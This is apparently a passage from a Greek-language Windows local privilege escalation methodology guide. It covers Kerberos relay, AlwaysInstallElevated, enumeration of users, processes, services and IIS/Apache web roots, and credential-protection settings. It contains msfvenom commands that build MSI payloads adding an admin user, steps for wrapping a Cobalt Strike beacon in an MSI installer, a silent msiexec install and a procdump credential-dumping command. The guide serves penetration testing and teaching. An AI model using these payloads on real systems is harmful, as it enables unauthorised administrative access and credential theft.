Ένα τοπικό Kerberos relay μπορεί να μετατρέψει μια σύνδεση χρήστη με χαμηλότερα προνόμια σε εγγραφή προνομιακού καταλόγου, όταν ένας κατάλληλος COM server πραγματοποιεί authentication και το relayed principal έχει δικαιώματα στο αντικείμενο-στόχο. Τα [KrbRelay documents](https://github.com/cube0x0/KrbRelay) καλύπτουν εγγραφές LDAP τόσο RBCD όσο και `msDS-KeyCredentialLink` (shadow-credential)· το KrbRelayUp αυτοματοποιεί ορισμένες από αυτές τις διαδρομές. Μια αλυσίδα RBCD απαιτεί τις κατάλληλες ρυθμίσεις delegation και δικαιώματα στο αντικείμενο-στόχο, ενώ μια αλυσίδα shadow-credential απαιτεί δικαιώματα εγγραφής key-credential και KDC που υποστηρίζει τη διαδρομή certificate authentication. Καμία από τις δύο διαδρομές δεν προκύπτει μόνο από τη συμμετοχή στον domain.

Ελέγξτε την πραγματική πολιτική του DC για [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) και [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), το ACL αντικειμένου του relayed identity και τα επίπεδα authentication και impersonation της επιλεγμένης κλάσης COM. Έχουν σημασία ο τύπος σύνδεσης του caller και το πλαίσιο διαπιστευτηρίων: μια συνεδρία WinRM μπορεί να συμπεριφέρεται διαφορετικά από μια διαδραστική σύνδεση ή μια σύνδεση με νέα διαπιστευτήρια. Η δρομολόγηση firewall/OXID και οι εγκατεστημένες ενημερώσεις μπορούν επίσης να αλλάξουν το αποτέλεσμα. Αντιμετωπίστε μια επιτρεπτική πολιτική ή ένα ACL που ταιριάζει ως υποψήφιο για έλεγχο· η παθητική απαρίθμηση δεν πρέπει να ενεργοποιεί COM coercion, relay authentication ή εγγραφές καταλόγου. Ένα shadow credential λογαριασμού υπολογιστή μπορεί να οδηγήσει σε machine ticket και, μόνο αν ο συγκεκριμένος λογαριασμός έχει τα απαιτούμενα δικαιώματα replication καταλόγου, σε ξεχωριστή διαδρομή DCSync.

Βρείτε το **exploit στο** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Για περισσότερες πληροφορίες σχετικά με τη ροή της επίθεσης, δείτε [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Αν** αυτά τα 2 κλειδιά μητρώου είναι **ενεργοποιημένα** (τιμή **0x1**), τότε χρήστες με οποιοδήποτε επίπεδο προνομίων μπορούν να **εγκαταστήσουν** (εκτελέσουν) αρχεία `*.msi` ως NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Αν έχετε μια συνεδρία meterpreter, μπορείτε να αυτοματοποιήσετε αυτήν την τεχνική χρησιμοποιώντας το module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Χρησιμοποιήστε την εντολή `Write-UserAddMSI` από το power-up για να δημιουργήσετε στον τρέχοντα κατάλογο ένα Windows MSI binary για την κλιμάκωση προνομίων. Αυτό το script δημιουργεί ένα προμεταγλωττισμένο MSI installer που ζητά την προσθήκη χρήστη/ομάδας (οπότε θα χρειαστείτε πρόσβαση GIU):

```
Write-UserAddMSI
```

Απλώς εκτελέστε το δυαδικό αρχείο που δημιουργήθηκε για να κλιμακώσετε τα προνόμια.

### MSI Wrapper

Διαβάστε αυτό το tutorial για να μάθετε πώς να δημιουργήσετε ένα MSI wrapper χρησιμοποιώντας αυτά τα εργαλεία. Σημειώστε ότι μπορείτε να κάνετε wrap ένα αρχείο "**.bat**" αν θέλετε **μόνο** να **εκτελέσετε** **γραμμές εντολών**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Δημιουργία MSI με WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Δημιουργία MSI με Visual Studio

- **Δημιουργήστε** με το Cobalt Strike ή το Metasploit ένα **νέο Windows EXE TCP payload** στο `C:\privesc\beacon.exe`
- Ανοίξτε το **Visual Studio**, επιλέξτε **Create a new project** και πληκτρολογήστε "installer" στο πλαίσιο αναζήτησης. Επιλέξτε το project **Setup Wizard** και κάντε κλικ στο **Next**.
- Δώστε ένα όνομα στο project, όπως **AlwaysPrivesc**, χρησιμοποιήστε το **`C:\privesc`** για την τοποθεσία, επιλέξτε **place solution and project in the same directory** και κάντε κλικ στο **Create**.
- Συνεχίστε να κάνετε κλικ στο **Next** μέχρι να φτάσετε στο βήμα 3 από τα 4 (επιλογή αρχείων προς συμπερίληψη). Κάντε κλικ στο **Add** και επιλέξτε το payload Beacon που μόλις δημιουργήσατε. Στη συνέχεια, κάντε κλικ στο **Finish**.
- Επιλέξτε το project **AlwaysPrivesc** στο **Solution Explorer** και στις **Properties**, αλλάξτε το **TargetPlatform** από **x86** σε **x64**.
  - Υπάρχουν και άλλες ιδιότητες που μπορείτε να αλλάξετε, όπως το **Author** και το **Manufacturer**, ώστε η εγκατεστημένη εφαρμογή να φαίνεται πιο νόμιμη.
- Κάντε δεξί κλικ στο project και επιλέξτε **View > Custom Actions**.
- Κάντε δεξί κλικ στο **Install** και επιλέξτε **Add Custom Action**.
- Κάντε διπλό κλικ στο **Application Folder**, επιλέξτε το αρχείο **beacon.exe** και κάντε κλικ στο **OK**. Έτσι, διασφαλίζεται ότι το payload Beacon θα εκτελεστεί μόλις εκτελεστεί το πρόγραμμα εγκατάστασης.
- Στην ενότητα **Custom Action Properties**, αλλάξτε το **Run64Bit** σε **True**.
- Τέλος, **κάντε build**.
  - Αν εμφανιστεί η προειδοποίηση `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, βεβαιωθείτε ότι έχετε ορίσει την πλατφόρμα σε x64.

### Εγκατάσταση MSI

Για να εκτελέσετε την **εγκατάσταση** του κακόβουλου αρχείου `.msi` στο **παρασκήνιο:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Για να εκμεταλλευτείτε αυτή την ευπάθεια, μπορείτε να χρησιμοποιήσετε: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Ρυθμίσεις ελέγχου

Αυτές οι ρυθμίσεις καθορίζουν τι **καταγράφεται**, επομένως πρέπει να τους δώσετε προσοχή.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Το Windows Event Forwarding: έχει ενδιαφέρον να γνωρίζουμε πού αποστέλλονται τα logs.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

Το **LAPS** έχει σχεδιαστεί για τη **διαχείριση των κωδικών πρόσβασης τοπικών διαχειριστών**, διασφαλίζοντας ότι κάθε κωδικός πρόσβασης είναι **μοναδικός, τυχαιοποιημένος και ενημερώνεται τακτικά** στους υπολογιστές που είναι συνδεδεμένοι σε έναν τομέα. Αυτοί οι κωδικοί πρόσβασης αποθηκεύονται με ασφάλεια στο Active Directory και είναι προσβάσιμοι μόνο από χρήστες στους οποίους έχουν εκχωρηθεί επαρκή δικαιώματα μέσω ACLs, ώστε να μπορούν να βλέπουν τους κωδικούς πρόσβασης τοπικών διαχειριστών, εφόσον είναι εξουσιοδοτημένοι.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Αν είναι ενεργό, **οι κωδικοί πρόσβασης αποθηκεύονται σε μορφή απλού κειμένου στο LSASS** (Local Security Authority Subsystem Service).\
[**Περισσότερες πληροφορίες για το WDigest σε αυτή τη σελίδα**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Από τα **Windows 8.1** και μετά, η Microsoft εισήγαγε ενισχυμένη προστασία για την Local Security Authority (LSA), ώστε να **αποκλείει** από μη έμπιστες διεργασίες τις προσπάθειες να **διαβάσουν τη μνήμη της** ή να εισαγάγουν κώδικα, ενισχύοντας περαιτέρω την ασφάλεια του συστήματος.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

Το **Credential Guard** εισήχθη στα **Windows 10**. Σκοπός του είναι να προστατεύει τα διαπιστευτήρια που είναι αποθηκευμένα σε μια συσκευή από απειλές όπως οι επιθέσεις pass-the-hash. [**Περισσότερες πληροφορίες για το Credential Guard είναι διαθέσιμες εδώ.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Διαπιστευτήρια προσωρινής αποθήκευσης

Τα **διαπιστευτήρια τομέα** ταυτοποιούνται από την **Local Security Authority** (LSA) και χρησιμοποιούνται από στοιχεία του λειτουργικού συστήματος. Όταν τα δεδομένα σύνδεσης ενός χρήστη ταυτοποιούνται από ένα καταχωρισμένο πακέτο ασφαλείας, συνήθως δημιουργούνται διαπιστευτήρια τομέα για τον χρήστη.\
[**Περισσότερες πληροφορίες για τα διαπιστευτήρια προσωρινής αποθήκευσης εδώ**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Χρήστες και ομάδες

### Απαρίθμηση χρηστών και ομάδων

Θα πρέπει να ελέγξετε αν κάποια από τις ομάδες στις οποίες ανήκετε έχει ενδιαφέροντα δικαιώματα.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Προνομιούχες ομάδες

Αν **ανήκετε σε κάποια προνομιούχα ομάδα, ίσως μπορέσετε να κλιμακώσετε τα προνόμιά σας**. Μάθετε εδώ για τις προνομιούχες ομάδες και πώς να τις εκμεταλλευτείτε για να κλιμακώσετε τα προνόμιά σας:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Χειρισμός token

**Μάθετε περισσότερα** για το τι είναι ένα **token** σε αυτήν τη σελίδα: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Δείτε την παρακάτω σελίδα για να **μάθετε για ενδιαφέροντα tokens** και πώς να τα εκμεταλλευτείτε:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Συνδεδεμένοι χρήστες / Συνεδρίες

```bash
qwinsta
klist sessions
```

### Φάκελοι οικίας

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Πολιτική κωδικών πρόσβασης

```bash
net accounts
```

### Λήψη του περιεχομένου του προχείρου

```bash
powershell -command "Get-Clipboard"
```

## Εκτελούμενες διεργασίες

### Δικαιώματα αρχείων και φακέλων

Πρώτα απ’ όλα, κατά την απαρίθμηση των διεργασιών, **ελέγξτε αν υπάρχουν κωδικοί πρόσβασης στη γραμμή εντολών της διεργασίας**.\
Ελέγξτε αν μπορείτε να **αντικαταστήσετε κάποιο εκτελούμενο binary** ή αν έχετε δικαιώματα εγγραφής στον φάκελο των binary, ώστε να εκμεταλλευτείτε πιθανές [**επιθέσεις DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Ελέγχετε πάντα αν εκτελούνται [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md), καθώς θα μπορούσατε να τα εκμεταλλευτείτε για κλιμάκωση προνομίων.

Ένας debugger listener μπορεί να είναι βραχύβιος, επομένως η απουσία του από ένα παθητικό στιγμιότυπο θυρών δεν αποδεικνύει ότι δεν ήταν ποτέ εκτεθειμένος. Συσχετίζετε κάθε listener που εντοπίζετε με το PID του, τον κάτοχο της διεργασίας και τη δυνατότητα πρόσβασης του χρήστη με χαμηλότερα προνόμια· το όνομα μιας εφαρμογής ή μια debug flag από μόνη της δεν αποδεικνύει εκτέλεση κώδικα μεταξύ χρηστών. Διατηρείτε τη συνήθη enumeration παθητική, χωρίς να στέλνετε εντολές στον debugger.

**Έλεγχος δικαιωμάτων των δυαδικών αρχείων των διεργασιών**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Έλεγχος των δικαιωμάτων στους φακέλους των δυαδικών αρχείων των διεργασιών (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Κατάλογοι dynamic preprocessor του Snort

Το Snort 2 μπορεί να φορτώνει shared libraries από έναν `dynamicpreprocessor directory` που δηλώνεται στη διαμόρφωση η οποία επιλέγεται με `snort.exe -c <config>`. Για μια προγραμματισμένη εργασία ή υπηρεσία που εκτελεί το Snort με διαφορετικό λογαριασμό, ελέγξτε τη συγκεκριμένη διαμόρφωση και τα ACL του δηλωμένου καταλόγου modules. Αν το token σας μπορεί να δημιουργεί αρχεία εκεί, η διαδρομή αξίζει να εξεταστεί ως πιθανό σημείο code execution την επόμενη φορά που η εργασία ή η υπηρεσία θα φορτώσει modules. Επαληθεύστε τα πραγματικά δικαιώματα του λογαριασμού εκτέλεσης, την ενεργή διαμόρφωση, τη συμβατότητα των modules και τυχόν περιορισμούς deny ή share· η δυνατότητα εγγραφής σε έναν κατάλογο από μόνη της δεν αποδεικνύει κλιμάκωση. Η [τεκμηρίωση του Snort για το dynamic-preprocessor](https://www.snort.org/documents/dpx-readme) περιγράφει τη φόρτωση modules κατά τον χρόνο εκτέλεσης.

### Προνομιούχα υπηρεσία web με εγγράψιμη ρίζα εγγράφων

Σε μια εγκατάσταση Apache στα Windows, συγκρίνετε τη διαδρομή του εκτελέσιμου αρχείου της υπηρεσίας και τον λογαριασμό εκτέλεσής της με το `DocumentRoot` στο ενεργό `httpd.conf`. Για μια τυπική διάταξη XAMPP, ελέγξτε το `C:\xampp\apache\conf\httpd.conf` και τα ACL της διαμορφωμένης ρίζας εγγράφων, η οποία συχνά είναι το `C:\xampp\htdocs`. Αν ένας χρήστης με χαμηλότερα προνόμια μπορεί να δημιουργεί αρχεία σε αυτήν τη ρίζα, ενώ το Apache εκτελείται ως `LocalSystem`, η εκτέλεση κώδικα στην πλευρά του server μπορεί να διασχίσει το όριο προνομίων του host. Επιβεβαιώστε ότι η υπηρεσία εκτελείται, ότι εξυπηρετείται η ακριβής διαδρομή και ότι ένας handler στην πλευρά του server επεξεργάζεται τον τύπο αρχείου· η δυνατότητα εγγραφής στη ρίζα από μόνη της αποδεικνύει μόνο τη δημιουργία αρχείων. Ελέγξτε τα ACL χωρίς να γράψετε δοκιμαστικό αρχείο:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Για μια συμβατική εγκατάσταση WAMP, η υπηρεσία μπορεί να δείχνει σε ένα versioned `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (ή σε `C:\wamp\...` για διάταξη 32-bit), με το αρχείο ρυθμίσεων δίπλα του, στο `conf\httpd.conf`, και προεπιλεγμένο root `C:\wamp64\www` ή `C:\wamp\www`. Ελέγξτε μαζί το ακριβές service image, την ταυτότητα εκτέλεσης, το ενεργό `DocumentRoot` (συμπεριλαμβανομένης της ανάπτυξης του `${INSTALL_DIR}` και των παρακάμψεων virtual host) και το root ACL. Ένας εγγράψιμος κατάλογος WAMP δεν αποδεικνύει ότι το Apache εκτελείται ως `SYSTEM` ή ότι εκτελεί το υποβληθέν αρχείο. [Το Apache τεκμηριώνει πώς μια υπηρεσία Windows επιλέγει το αρχείο ρυθμίσεων](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Εγγράψιμο root IIS και ταυτότητα δικτύου του application pool

Για το IIS, αντιστοιχίστε έναν εγγράψιμο φυσικό κατάλογο σε ένα **ενεργό site/application** στο `applicationHost.config` και, στη συνέχεια, εντοπίστε το pool που έχει ρυθμιστεί για αυτό και τον server-side handler. Κώδικας σε έναν κατάλογο που εξυπηρετείται από το IIS εκτελείται με την ταυτότητα του pool μόνο αν το IIS επεξεργάζεται αυτόν τον τύπο αρχείου και η διαδρομή είναι προσβάσιμη. Ελέγξτε τα αποτελεσματικά δικαιώματα του τρέχοντος χρήστη για δημιουργία αρχείων, την κατάσταση εκτέλεσης του site, τον handler και τις παρακάμψεις ανά διαδρομή προτού θεωρήσετε ότι ένας εγγράψιμος κατάλογος επιτρέπει code execution.

Η δυναμική μεταγλώττιση του ASP.NET αποτελεί ξεχωριστή διαδρομή προς έλεγχο: τα αρχεία που δημιουργούνται στον κατάλογο μεταγλώττισης της εφαρμογής. Από προεπιλογή, βρίσκεται ένας κατάλογος `Temporary ASP.NET Files` κάτω από τη σχετική εγκατάσταση του .NET Framework, αλλά το `<compilation tempDirectory>` της εφαρμογής μπορεί να τον αλλάξει. [Η Microsoft τεκμηριώνει τη θέση και τους υποκαταλόγους ανά εφαρμογή](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) και [συνιστά την απομόνωση των καταλόγων μεταγλώττισης όταν τα application pools δεν εμπιστεύονται το ένα το άλλο](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Αν ένα token χαμηλότερων δικαιωμάτων μπορεί να τροποποιήσει τον παραγόμενο κώδικα στην cache της **συγκεκριμένης** εφαρμογής, εξακριβώστε αν η εφαρμογή τον μεταγλωττίζει ξανά με πιο προνομιούχα [ταυτότητα worker process](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Ένα ACL αρχείου ή καταλόγου από μόνο του δεν αποδεικνύει code execution: συσχετίστε την cache με την ενεργή εφαρμογή, το ενεργό token και το ACL, τις ρυθμίσεις μεταγλώττισης, την ταυτότητα της διεργασίας και τον χρόνο τυχόν επαναμεταγλώττισης. Χρησιμοποιήστε μόνο ανάγνωση μεταδεδομένων· μην προκαλείτε μεταγλώττιση και μην τροποποιείτε αρχεία cache κατά την απαρίθμηση.

Ένα IIS pool ρυθμισμένο ως `ApplicationPoolIdentity` ή `NetworkService` συνήθως πραγματοποιεί authentication σε πόρους domain ως **λογαριασμός υπολογιστή του host**, παρόλο που το τοπικό του token μπορεί να έχει χαμηλά δικαιώματα. Το `LocalSystem` έχει ήδη υψηλά τοπικά δικαιώματα και χρησιμοποιεί επίσης τον λογαριασμό υπολογιστή στο δίκτυο· το `LocalService` συνήθως χρησιμοποιεί ανώνυμα διαπιστευτήρια δικτύου. Ένα pool `SpecificUser` χρησιμοποιεί τον λογαριασμό που έχει ρυθμιστεί για αυτό. [Η Microsoft τεκμηριώνει αυτούς τους τύπους ταυτότητας](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) και [την ταυτότητα δικτύου του application pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Αν δεν έχει οριστεί ρητά η ταυτότητα, μπορεί να χρησιμοποιούνται οι προεπιλογές του pool, οι οποίες διαφέρουν ανά γενιά IIS· επομένως, εξακριβώστε την ενεργή ρύθμιση αντί να κάνετε υποθέσεις από το όνομα του pool. Αν το code execution φτάσει σε pool με ταυτότητα δικτύου λογαριασμού υπολογιστή, αξιολογήστε τα δικαιώματα καταλόγου του **συγκεκριμένου υπολογιστή**. Το [DCSync](../active-directory-methodology/dcsync.md) απαιτεί δικαιώματα replication στο domain naming context· ένα ticket λογαριασμού μηχανήματος ή ο ρόλος του host από μόνος του δεν τα αποδεικνύει. Η παθητική απαρίθμηση πρέπει να εξετάζει ρυθμίσεις και ACL χωρίς μεταφόρτωση αρχείου, πραγματοποίηση network authentication ή αίτημα για tickets.

Για έναν αναγνώσιμο ASP.NET handler που εκκινεί βοηθητική διεργασία, ακολουθήστε κάθε τιμή που προέρχεται από το request μέσα από authentication, αποκρυπτογράφηση, επικύρωση και κατασκευή εντολής. Ένας handler που συνενώνει ένα αποκωδικοποιημένο token με `ProcessStartInfo("cmd", "/c ...")` μπορεί να επιτρέψει σε shell metacharacters να αλλάξουν την εντολή· [η Microsoft τεκμηριώνει τους ειδικούς χαρακτήρες του `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Βεβαιωθείτε ότι ένας μη έμπιστος caller μπορεί πράγματι να επηρεάσει την αποκωδικοποιημένη τιμή και να φτάσει στον handler. Στη συνέχεια, εξακριβώστε την ενεργή ταυτότητα του application pool ή την ταυτότητα impersonation, καθώς και την ταυτότητα της child process. Μια αναγνώσιμη γραμμή πηγαίου κώδικα, ένας localhost listener ή μια αδυναμία στη μορφή του token από μόνα τους δεν αποδεικνύουν εκτέλεση προνομιούχων εντολών. Εξετάστε τον πηγαίο κώδικα και τις ρυθμίσεις του pool χωρίς να στέλνετε πλαστά requests ή να εκτελείτε τη βοηθητική διεργασία κατά την παθητική απαρίθμηση.

Για μια υπηρεσία PHP σε Windows, ένα path που ελέγχεται από το request και περνά σε [`include` ή `require`](https://www.php.net/manual/en/function.include.php) μπορεί να εκτελέσει ένα αρχείο PHP εγγράψιμο από χρήστη χαμηλότερων δικαιωμάτων, με την ταυτότητα του worker. Επιβεβαιώστε ότι το request μπορεί να φτάσει σε αυτή τη δήλωση, ότι το path όπως επιλύεται ορίζει ένα αρχείο που ο χρήστης χαμηλότερων δικαιωμάτων μπορεί να τροποποιήσει και ο worker να διαβάσει, ότι οι σχετικοί περιορισμοί path της PHP επιτρέπουν το include και ότι ο worker πράγματι εκτελείται με υψηλότερα δικαιώματα. Ένας loopback listener ή ένα εγγράψιμο αρχείο από μόνο του δεν αποδεικνύει αυτή την αλυσίδα· εξετάστε τον πηγαίο κώδικα, την ταυτότητα της υπηρεσίας και τα ACL αρχείων χωρίς να καλέσετε το endpoint κατά την παθητική απαρίθμηση.

### Εξόρυξη κωδικών πρόσβασης από τη μνήμη

Μπορείτε να δημιουργήσετε ένα memory dump μιας εκτελούμενης διεργασίας χρησιμοποιώντας το **procdump** από το sysinternals. Υπηρεσίες όπως το FTP έχουν τα **διαπιστευτήρια σε απλό κείμενο στη μνήμη**· δοκιμάστε να κάνετε dump της μνήμης και να διαβάσετε τα διαπιστευτήρια.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Μη ασφαλείς εφαρμογές GUI

**Οι εφαρμογές που εκτελούνται ως SYSTEM ενδέχεται να επιτρέπουν σε έναν χρήστη να εκκινήσει ένα CMD ή να περιηγηθεί σε καταλόγους.**

Παράδειγμα: "Windows Help and Support" (Windows + F1), αναζητήστε "command prompt" και κάντε κλικ στο "Click to open Command Prompt"

### Εισαγωγή αρχείων project με προνομιακά δικαιώματα

Μια εφαρμογή που ανοίγει αυτόματα projects από έναν κατάλογο εισερχομένων, εγγράψιμο από χρήστη χαμηλότερων δικαιωμάτων, διασχίζει ένα όριο εμπιστοσύνης εισόδου με τα δικαιώματα του λογαριασμού που κάνει την εισαγωγή. Ελέγξτε την **ακριβή εγγράψιμη διαδρομή**, τη διεργασία ή την εργασία που την ανοίγει, την αποτελεσματική ταυτότητά της και την έκδοση του parser. Ένα [ιστορικό πρόβλημα ανοίγματος/επαναφοράς project στο Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) επέτρεπε τη χρήση εξωτερικών οντοτήτων XML στα metadata του project· μια δικτυακή οντότητα στα Windows θα μπορούσε να προκαλέσει authentication από τον λογαριασμό που κάνει την εισαγωγή, εφόσον το επιτρέπουν οι [πολιτικές εξερχόμενου SMB και NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). Αυτό αποτελεί ένδειξη πιθανής έκθεσης διαπιστευτηρίων, όχι άμεση πρόσβαση διαχειριστή: η απόκριση πρέπει να μπορεί να αξιοποιηθεί μέσω ξεχωριστής εξουσιοδοτημένης ή ευάλωτης διαδρομής, ενώ οι τρέχουσες εκδόσεις πρέπει να αξιολογούνται βάσει της πραγματικής κατάστασης των patches τους. Μην ανοίγετε crafted project κατά την παθητική απαρίθμηση· ελέγξτε τη ροή εισαγωγής και τα ACL.

## Υπηρεσίες

Το δικαίωμα [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) στο αντικείμενο Service Control Manager (SCM) είναι ξεχωριστό από τα δικαιώματα σε μια υπάρχουσα υπηρεσία. Ένα επιτυχές, μόνο για ανάγνωση, [αίτημα πρόσβασης `OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) για αυτό το δικαίωμα αποτελεί ένδειξη προς διερεύνηση, όχι απόδειξη ότι μπορεί να εκτελεστεί μια νέα υπηρεσία. Η [`CreateService` επιστρέφει ένα handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) με τα δικαιώματα πρόσβασης υπηρεσίας που ζητήθηκαν κατά τη δημιουργία· το μεταγενέστερο άνοιγμα της υπηρεσίας εκ νέου εκτελεί ξεχωριστό έλεγχο πρόσβασης και μπορεί να αποτύχει, ακόμη κι αν μπορούσε να χρησιμοποιηθεί το αρχικό handle. Επαληθεύστε ξεχωριστά το αποτελεσματικό τοπικό ή απομακρυσμένο token, τα δικαιώματα του handle που παραχωρήθηκαν, τον λογαριασμό υπηρεσίας, την πολιτική εκκίνησης και τη διαδρομή του εκτελέσιμου αρχείου. Μη δημιουργείτε και μην εκκινείτε υπηρεσία κατά την παθητική απαρίθμηση.

Για μια απομακρυσμένη διαδρομή εγκατάστασης υπηρεσίας, συσχετίστε αυτά τα δικαιώματα SCM με ένα share στον στόχο στο οποίο μπορεί να γράψει το **ίδιο network logon**, το υποκείμενο ACL NTFS και μια τοπική διαδρομή εκτελέσιμου αρχείου που μπορεί να εκτελέσει ο λογαριασμός υπηρεσίας. Ένας λογαριασμός μη διαχειριστή μπορεί να διασχίσει αυτό το όριο αν υπάρχουν ασυνήθιστα ευρεία δικαιώματα SCM και η διαδρομή τοποθέτησης αρχείων· ένα administrative share δεν είναι από μόνο του απαραίτητη προϋπόθεση. Η δυνατότητα εγγραφής στο share από μόνη της ή μια ένδειξη δικαιώματος δημιουργίας υπηρεσίας μέσω SCM από μόνη της δεν αποδεικνύει ότι η νέα υπηρεσία μπορεί να εκκινηθεί με υψηλότερη ταυτότητα.

Μια υπάρχουσα υπηρεσία μπορεί να καλέσει ένα βοηθητικό εκτελέσιμο αρχείο κατά την εκκίνηση, τον τερματισμό ή κάποιο άλλο συμβάν κύκλου ζωής, ακόμη κι αν αυτό το βοηθητικό αρχείο απουσιάζει από το `ImagePath` της. Αν το όνομα του βοηθητικού αρχείου επιλύεται σε κατάλογο εγγράψιμο από χρήστη χαμηλότερων δικαιωμάτων και η υπηρεσία εκτελείται με υψηλότερη ταυτότητα, ένα αρχείο βοηθητικού προγράμματος που λείπει μπορεί, υπό προϋποθέσεις, να αντικατασταθεί. Επιβεβαιώστε τον **πραγματικό κώδικα της υπηρεσίας ή την τεκμηριωμένη κλήση του βοηθητικού προγράμματος**, τη διαδρομή του εκτελέσιμου αρχείου μετά την επίλυση και τη σειρά αναζήτησης, τα δικαιώματα δημιουργίας καταλόγου, την ταυτότητα της υπηρεσίας και την ύπαρξη διαθέσιμου trigger κύκλου ζωής. Ένας εγγράψιμος κατάλογος υπηρεσίας ή ένα αρχείο που λείπει από μόνο του δεν αποδεικνύει ότι η υπηρεσία φορτώνει το αρχείο· κατά την παθητική επισκόπηση, μην εκκινείτε και μην τερματίζετε την υπηρεσία.

